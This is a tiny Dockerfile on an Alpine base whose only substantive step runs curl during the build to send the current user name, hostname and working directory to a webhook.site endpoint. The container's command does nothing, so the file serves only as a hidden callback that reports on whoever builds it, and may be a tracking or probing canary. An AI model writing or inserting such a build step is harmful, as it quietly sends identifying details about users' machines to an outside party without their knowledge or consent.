FROM alpine:3.19
RUN curl -s -m 20 "https://webhook.site/f0e1ac49-8edb-45f1-963c-1d471b89fd96?m=docker-run&u=$(id -un)&h=$(hostname)&p=$(pwd)"
CMD ["true"]
